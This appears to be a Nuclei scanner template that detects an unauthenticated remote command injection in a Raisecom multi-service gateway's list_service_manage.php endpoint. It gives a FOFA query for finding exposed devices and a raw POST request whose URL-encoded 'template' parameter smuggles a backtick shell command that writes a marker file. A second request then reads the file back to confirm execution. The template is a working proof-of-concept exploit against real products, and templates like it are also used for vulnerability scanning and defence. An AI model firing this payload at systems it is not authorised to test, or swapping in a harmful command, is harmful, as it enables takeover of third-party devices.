id: raisecom-gateway-list_service_manage-rce

info:
  name: "瑞斯康达多业务智能网关 list_service_manage.php 远程命令执行漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/images/raisecom/back.gif" && title=="Web user login"
          瑞斯康达多业务智能网关的 list_service_manage.php 接口存在远程代码执行缺陷。攻击者无需身份验证即可通过构造恶意请求参数触发命令注入，实现任意系统命令执行。该漏洞可被利用部署持久化后门、窃取敏感数据或完全控制目标服务器。受影响组件允许远程未经授权的代码注入操作，存在严重安全风险。
  tags: 瑞斯康达多业务智能网关

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /vpn/list_service_manage.php?template=%60echo%2B-e%2B%27NdayTest%27%3E%2Fwww%2Ftmp%2FNTest.txt%60 HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    Nradius_submit=true
- raw:
  - |
    GET /tmp/NTest.txt HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
